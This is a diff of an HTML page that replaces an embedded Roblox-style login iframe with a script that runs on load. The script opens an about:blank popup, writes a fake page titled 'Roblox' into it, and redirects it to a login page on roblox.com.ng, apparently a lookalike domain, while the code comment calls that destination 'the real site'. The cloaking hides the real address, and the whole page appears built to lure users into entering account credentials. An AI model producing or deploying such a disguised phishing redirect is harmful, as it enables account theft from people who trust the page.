@@ -1,24 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Roblox Login Embed</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            overflow: hidden;
+    <title>Loading...</title>
+    <script>
+        function openCloak() {
+            const win = window.open("about:blank", "_blank");
+
+            if (!win) {
+                alert("Popup blocked. Enable popups and try again.");
+                return;
+            }
+
+            const url = "https://www.roblox.com.ng/login?returnUrl=109840659740";
+
+            // Write a fake blank page first
+            win.document.write(`
+                <html>
+                <head>
+                    <title>Roblox</title>
+                    <style>
+                        body { margin: 0; background: white; }
+                    </style>
+                </head>
+                <body></body>
+                </html>
+            `);
+
+            win.document.close();
+
+            // Then redirect the about:blank tab to the real site
+            win.location.href = url;
         }
-        iframe {
-            width: 100vw;
-            height: 100vh;
-            border: none;
-        }
-    </style>
+    </script>
 </head>
-<body>
-    <iframe 
-        src="https://www.roblox.com.ng/login?returnUrl=109840659740"
-        allowfullscreen>
-    </iframe>
+<body onload="openCloak()">
 </body>
 </html>
